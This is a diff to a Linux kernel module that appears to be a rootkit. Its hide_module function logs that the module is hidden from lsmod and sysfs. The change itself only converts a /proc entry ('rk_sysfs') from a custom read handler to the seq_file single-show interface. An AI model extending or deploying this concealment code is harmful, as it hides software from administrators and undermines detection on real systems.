@@ -7,6 +7,7 @@
 #include <linux/module.h>
 #include <linux/printk.h>
 #include <linux/proc_fs.h>
+#include <linux/seq_file.h>
 
 static struct proc_dir_entry *entry;
 
@@ -17,22 +18,15 @@ static void hide_module(void)
 	pr_info("rk: module hidden from lsmod and sysfs\n");
 }
 
-static ssize_t cloak_read(struct file *file, char __user *buffer,
-			   size_t count, loff_t *position)
+static int cloak_show(struct seq_file *m, void *v)
 {
-	static const char msg[] = "hidden\n";
-
-	return simple_read_from_buffer(buffer, count, position,
-				       msg, sizeof(msg) - 1);
+	seq_puts(m, "hidden\n");
+	return 0;
 }
-
-static const struct proc_ops cloak_ops = {
-	.proc_read = cloak_read,
-};
 
 static int __init cloak_init(void)
 {
-	entry = proc_create("rk_sysfs", 0444, NULL, &cloak_ops);
+	entry = proc_create_single("rk_sysfs", 0444, NULL, cloak_show);
 	if (!entry)
 		return -ENOMEM;
 
